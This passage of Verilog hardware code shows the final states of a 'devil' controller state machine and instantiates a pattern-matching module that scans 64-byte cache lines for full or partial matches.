                    r_passive_func <= `DUMMY_REPLY;

                    if(i_end_reply && r_trigger_reply)
                        fsm_devil_controller <= DEVIL_END_OP; 
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                               
                end
            DEVIL_END_OP:  // 8
                begin 
                    r_trigger_reply <= 0;
                    fsm_devil_controller <= DEVIL_IDLE;                                                  
                end
            default :                                                                
                begin                                                                  
                    fsm_devil_controller <= DEVIL_IDLE;                                     
                end                                                                    
            endcase            
        end
    end        

// Instantiation Passive devil module
    match_pattern #(
		.CL_SIZE(64)
    ) match_pattern_inst(
        .i_pattern(r_pattern),
        .i_pattern_size(r_pattern_size),
        // .i_cache_line(w_test_i_cache_line_active_devil),
        .i_cache_line(i_cache_line_active_devil),
        .i_trigger(r_match_pattern_trigger),
        .o_full_match(w_full_match),
        .o_partial_match(w_partial_match),
        .o_match_offset(w_match_offset),
        .o_op_end(w_op_end)
    );

endmodule
